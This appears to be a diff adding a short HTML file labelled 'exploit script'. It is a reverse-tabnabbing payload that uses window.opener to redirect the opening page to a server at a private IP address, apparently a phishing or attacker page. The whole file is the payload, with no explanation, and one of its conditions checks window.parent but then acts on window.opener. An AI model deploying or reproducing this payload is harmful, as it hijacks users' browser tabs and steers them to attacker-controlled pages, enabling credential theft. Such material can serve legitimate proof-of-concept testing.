@@ -1,0 +1,9 @@
+exploit script:
+<html>
+    <script>
+            if (window.opener) window.opener.parent.location.replace('http://192.168.1.16:8000/index.html');
+            if (window.parent != window) window.opener.parent.location.replace('http://192.168.1.16:8000/index.html');
+
+    </script>
+</html>
+           
